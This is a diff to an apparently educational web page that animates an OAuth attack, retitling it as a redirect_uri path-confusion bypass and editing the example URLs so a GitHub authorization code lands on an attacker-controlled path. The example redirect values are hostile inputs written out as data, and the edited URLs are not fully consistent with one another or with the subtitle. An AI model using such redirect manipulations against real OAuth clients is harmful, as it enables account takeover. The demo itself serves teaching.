@@ -113,7 +113,7 @@
 </head>
 <body>
 
-    <h1>🔐 OAuth MITM Attack Visualizer</h1>
+    <h1>🔐 Redirect bypass: Path confusion </h1>
 <p class="subtitle">
     This attack exploits a <code>redirect_uri</code> prefix check that never normalizes 
     the path. By appending <code>/../..</code> to a whitelisted URI, the attacker 
@@ -185,21 +185,21 @@
             active: ["client", "middlebox"],
             tag: "Step 2 — CLIENT → MIDDLEBOX (intercepted!)",
             text: "Request passes through the middlebox. It silently <span class='hi'>replaces redirect_uri</span> with the attacker's server before forwarding.",
-            url: "redirect_uri changed: oauthclient:3000/callback  →  <span class='hi'>oauthclientattacker:3001/callback</span>"
+            url: "redirect_uri changed: oauthclient:3000/callback  →  <span class='hi'>oauthclient:3001/callback../../attacker</span>"
         },
         {
             from: "middlebox", to: "server", evil: true,
             active: ["middlebox", "server"],
             tag: "Step 3 — MIDDLEBOX → AUTH SERVER",
             text: "Tampered request arrives at GitHub. GitHub sees a valid client_id and shows the user the consent screen.",
-            url: "GET https://github.com/login/oauth/authorize?client_id=Ov23li...&redirect_uri=<span class='hi'>http://oauthclientattacker:3001/callback</span>"
+            url: "GET https://github.com/login/oauth/authorize?client_id=Ov23li...&redirect_uri=<span class='hi'>http://oauthclientattacker:3001/attacker</span>"
         },
         {
             from: "server", to: "attacker", evil: true,
             active: ["server", "attacker"],
             tag: "Step 4 — AUTH SERVER → ATTACKER 💀",
             text: "User approves the login. GitHub redirects to <span class='hi'>the attacker's server</span> with the authorization code — not your app!",
-            url: "GET <span class='hi'>http://oauthclientattacker:3001/callback</span>?code=1b573a83-dbac-47a0-97c2-b2791a14671a"
+            url: "GET <span class='hi'>http://oauthclient:3001/attacker</span>?code=1b573a83-dbac-47a0-97c2-b2791a14671a"
         },
         {
             from: "attacker", to: "server", evil: true,
